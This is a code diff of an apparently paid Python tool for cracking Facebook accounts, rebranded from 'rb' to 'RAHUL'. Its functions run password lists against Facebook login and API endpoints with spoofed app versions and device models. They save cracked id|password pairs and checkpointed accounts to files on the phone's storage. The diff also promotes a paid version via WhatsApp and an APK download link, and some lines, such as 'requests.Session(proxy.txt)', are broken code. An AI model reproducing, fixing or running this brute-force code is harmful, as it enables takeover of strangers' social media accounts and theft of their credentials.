@@ -9,7 +9,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python rb.py')
+        os.system('python RAHUL.py')
 except:pass
         
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
@@ -50,14 +50,14 @@ logo = ("""\033[1;32m
  |_| \_\_.__/  |_| \_\__,_|_| |_|\__,_|_|
                                             \033
 ---------------------------------------------- 
- Author    : RB rb
+ Author    : RB RAHUL
  Github    : Hide
- Facebook  : RB rb COMMAND
+ Facebook  : RB RAHUL COMMAND
  Status    : PAID
  Version   : 1.8
  Contact   : +918736899399
 ----------------------------------------------
- rb New version 1.8
+ RAHUL New version 1.8
  Note: Use Fligt Mode ON/OFf When Start CMD 
 \033[1;37m----------------------------------------------""")
 def linex():
@@ -198,7 +198,7 @@ def public():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python rb.py')
+                os.system('python RAHUL.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -271,7 +271,7 @@ def menu():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' Press enter to back ')
-                                os.system('python rb.py')
+                                os.system('python RAHUL.py')
                         elif xd in ['2','02']:
                                 import dump
                                 dump.Main()
@@ -296,7 +296,7 @@ def menu():
                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                         elif xd in ['7','07']:
-                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/rb_VPN1.0.apk/file');menu()
+                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/RAHUL_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                         elif xd in ['0','00']:
@@ -320,9 +320,9 @@ def menu():
                         url_wa = "https://api.whatsapp.com/send?phone=+918736899399&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi Rb Rahul Sir, I Need To Buy Your Paid rb PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi Rb Rahul Sir, I Need To Buy Your Paid RAHUL PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-                        print(' Run :  python rb.py')
+                        print(' Run :  python RAHUL.py')
                         exit()
         except ValueError:
                 exit()
@@ -358,7 +358,7 @@ def pak():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python rb.py')
+                os.system('python RAHUL.py')
 def bd():
                 user=[]
                 clear()
@@ -388,7 +388,7 @@ def bd():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python rb.py')
+                os.system('python RAHUL.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
@@ -443,13 +443,12 @@ def gmail():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python rb.py')
-             
+                os.system('python RAHUL.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [rb-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        session = requests.Session()
-     try:
+        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session(proxy.txt)
+        try:
                 first = names.split(' ')[0]
                 try:
                         last = names.split(' ')[1]
@@ -468,14 +467,14 @@ def ffb(ids,names,passlist):
                         if "c_user" in Rahul:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [rb-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/rb-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Rahul:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [rb-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/rb-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -489,7 +488,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [rb-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -539,14 +538,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [rb-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/rb-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [rb-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/rb-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -559,7 +558,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [rb-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -609,18 +608,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [rb-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/rb-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [rb-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/rb-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/rb-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -632,7 +631,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [rb-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -678,16 +677,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/rb-OK.txt','r').read()
+                                                okk=open('/sdcard/RAHUL-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [rb-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/rb-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [RAHUL-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/RAHUL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [rb-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/rb-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [RAHUL-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/RAHUL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
